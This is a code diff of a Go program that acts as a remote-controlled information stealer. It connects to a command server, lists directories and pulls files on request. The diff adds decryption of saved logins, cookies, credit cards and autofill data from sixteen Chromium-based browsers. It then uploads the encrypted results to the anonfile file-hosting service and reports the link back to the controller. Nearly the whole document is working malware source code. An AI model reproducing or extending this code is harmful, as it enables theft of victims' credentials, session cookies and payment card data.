@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"fmt"
 	"github.com/charmbracelet/log"
 	_ "github.com/mattn/go-sqlite3"
 	"github.com/wabarc/go-anonfile"
@@ -13,41 +14,80 @@ import (
 	"time"
 )
 
+var (
+	appData  = os.Getenv("LOCALAPPDATA")
+	browsers = map[string]string{
+		"amigo":                appData + "\\Amigo\\User Data",
+		"torch":                appData + "\\Torch\\User Data",
+		"kometa":               appData + "\\Kometa\\User Data",
+		"orbitum":              appData + "\\Orbitum\\User Data",
+		"cent-browser":         appData + "\\CentBrowser\\User Data",
+		"7star":                appData + "\\7Star\\7Star\\User Data",
+		"sputnik":              appData + "\\Sputnik\\Sputnik\\User Data",
+		"vivaldi":              appData + "\\Vivaldi\\User Data",
+		"google-chrome-sxs":    appData + "\\Google\\Chrome SxS\\User Data",
+		"google-chrome":        appData + "\\Google\\Chrome\\User Data",
+		"epic-privacy-browser": appData + "\\Epic Privacy Browser\\User Data",
+		"microsoft-edge":       appData + "\\Microsoft\\Edge\\User Data",
+		"uran":                 appData + "\\uCozMedia\\Uran\\User Data",
+		"yandex":               appData + "\\Yandex\\YandexBrowser\\User Data",
+		"brave":                appData + "\\BraveSoftware\\Brave-Browser\\User Data",
+		"iridium":              appData + "\\Iridium\\User Data",
+	}
+)
+
+func GetProfiles(browserPath string) []string {
+	var profiles []string
+	if CheckFileExist(browserPath + "\\Default") {
+		profiles = append(profiles, browserPath+"\\Default")
+	}
+
+	for i := 1; i < 6; i++ {
+		if CheckFileExist(browserPath + "\\Profile " + strconv.Itoa(i)) {
+			profiles = append(profiles, browserPath+"\\Profile "+strconv.Itoa(i))
+		}
+	}
+	return profiles
+}
+
 func main() {
-	var host = "localhost"
-	var port = 2137
+	host := "localhost"
+	port := 2137
 
 	for {
-		serverConn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
+		serverConn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
 		if err != nil {
 			log.Errorf("Failed to connect to server: %v", err)
-			// Wait for a while before reconnecting
-			time.Sleep(time.Second * 5)
+			time.Sleep(time.Second * 5) // Wait for a while before reconnecting
 			continue
 		}
 
 		log.Infof("Connected to server %s:%d", host, port)
 
-		// receive data from server
-		buffer := make([]byte, 1024)
-		for {
-			bytesRead, err := serverConn.Read(buffer)
-			if err != nil {
-				log.Errorf("Failed to receive data from server: %v", err)
-				_ = serverConn.Close()
-				break
-			}
+		handleServerConnection(serverConn)
+	}
+}
 
-			data := buffer[:bytesRead]
-			log.Infof("Received data: %s", data)
+func handleServerConnection(conn net.Conn) {
+	defer func() {
+		_ = conn.Close()
+	}()
 
-			s := string(data)
-
-			ParseCommands(s, serverConn)
+	buffer := make([]byte, 1024)
+	for {
+		bytesRead, err := conn.Read(buffer)
+		if err != nil {
+			log.Errorf("Failed to receive data from server: %v", err)
+			break
 		}
 
-		log.Warnf("Server closed the connection. Reconnecting...")
+		data := buffer[:bytesRead]
+		log.Infof("Received data: %s", data)
+
+		ParseCommands(string(data), conn)
 	}
+
+	log.Warnf("Server closed the connection. Reconnecting...")
 }
 
 func ParseCommands(input string, conn net.Conn) {
@@ -65,7 +105,6 @@ func ParseCommands(input string, conn net.Conn) {
 	} else if strings.HasPrefix(input, "files") {
 		args := ParseArgs(input, "files")
 
-		// string builder
 		var sb strings.Builder
 		sb.WriteString("Received files: \n")
 
@@ -76,7 +115,7 @@ func ParseCommands(input string, conn net.Conn) {
 		}
 
 		for _, file := range dir {
-			sb.WriteString("Name: " + strings.Join(args, " ") + file.Name() + ", IsFile: " + strconv.FormatBool(!file.IsDir()) + "\n")
+			sb.WriteString(fmt.Sprintf("Name: %s%s, IsFile: %t\n", strings.Join(args, " "), file.Name(), !file.IsDir()))
 		}
 
 		SendResponse(conn, strings.TrimRight(sb.String(), "\n"))
@@ -84,13 +123,7 @@ func ParseCommands(input string, conn net.Conn) {
 		args := ParseArgs(input, "download")
 		originalFile := args[0]
 
-		var split []string
-		if strings.Contains(originalFile, "/") {
-			split = strings.Split(originalFile, "/")
-		} else {
-			split = strings.Split(originalFile, "\\")
-		}
-
+		split := strings.Split(originalFile, string(os.PathSeparator))
 		tempFile := CreateTempFile(split[len(split)-1])
 		CopyFile(originalFile, tempFile)
 
@@ -101,61 +134,64 @@ func ParseCommands(input string, conn net.Conn) {
 		SendResponse(conn, file)
 	} else if strings.HasPrefix(input, "decrypt") {
 		args := ParseArgs(input, "decrypt")
-		_ = args[0] // TODO
+		option := args[0]
 
-		localStatePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
-		defaultChromePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data"
-
-		localState, stateDirPath := CreateTempAndCopyFile(localStatePath)
-
-		var profiles []string
-		if CheckFileExist(defaultChromePath + "\\Default") {
-			profiles = append(profiles, "Default")
-		}
-
-		for i := 1; i < 6; i++ {
-			if CheckFileExist(defaultChromePath + "\\Profile " + strconv.Itoa(i)) {
-				profiles = append(profiles, "Profile "+strconv.Itoa(i))
+		for browser, path := range browsers {
+			if !CheckFileExist(path) {
+				continue
 			}
+
+			profiles := GetProfiles(path)
+			localStateTemp := CreateTempFile("Local State Temp")
+			CopyFile(path+string(os.PathSeparator)+"Local State", localStateTemp)
+
+			password := RandomString(32)
+
+			var file *os.File
+			var data any
+			switch option {
+			case "login":
+				data = DecryptLoginData(profiles, localStateTemp.Name())
+				break
+			case "cookies":
+				data = DecryptCookieData(profiles, localStateTemp.Name())
+				break
+			case "cards":
+				data = DecryptCreditCardsData(profiles, localStateTemp.Name())
+				break
+			case "autofill":
+				data = DecryptAutoFillData(profiles)
+				break
+			}
+
+			CloseFile(localStateTemp)
+			_ = os.Remove(localStateTemp.Name())
+
+			marshal, _ := json.Marshal(data)
+			encryptData, _ := EncryptData(marshal, password)
+			file = CreateTempFile(browser + " " + option + " Data")
+			_, _ = file.Write(encryptData)
+
+			uploadFile := UploadFile(file.Name())
+			CloseFile(file)
+			_ = os.Remove(file.Name())
+
+			SendResponse(conn, fmt.Sprintf("Decrypted %s data from %s\nPassword: %s\nURL: %s", option, browser, password, uploadFile))
 		}
-
-		data := DecryptLoginData(profiles, localState)
-
-		_ = os.Remove(localState)
-		_ = os.Remove(stateDirPath)
-
-		marshal, _ := json.Marshal(data)
-		password := RandomString(32)
-		encryptData, _ := EncryptData(marshal, password)
-
-		file := CreateTempFile("LoginData")
-		_, err := file.Write(encryptData)
-		if err != nil {
-			log.Errorf("Failed to write encrypted data to file: %v", err)
-		}
-
-		uploadFile := UploadFile(file.Name())
-
-		CloseFile(file)
-		_ = os.Remove(file.Name())
-
-		SendResponse(conn, "Decrypted login data from chrome\nPassword: "+password+"\nURL: "+uploadFile)
 	}
 }
 
 func UploadFile(pathToFile string) string {
-	var content = ""
-	if data, err := anonfile.NewAnonfile(nil).Upload(pathToFile); err == nil {
-		content = data.Data.File.URL.Full
+	data, err := anonfile.NewAnonfile(nil).Upload(pathToFile)
+	if err != nil {
+		log.Errorf("Failed to upload file: %v", err)
+		return ""
 	}
-
-	return content
+	return data.Data.File.URL.Full
 }
 
 func ParseArgs(input string, command string) []string {
-	args := strings.Split(input, command+" ")
-	args = args[1:]
-	return args
+	return strings.Fields(strings.TrimPrefix(input, command+" "))
 }
 
 func SendResponse(conn net.Conn, response string) {
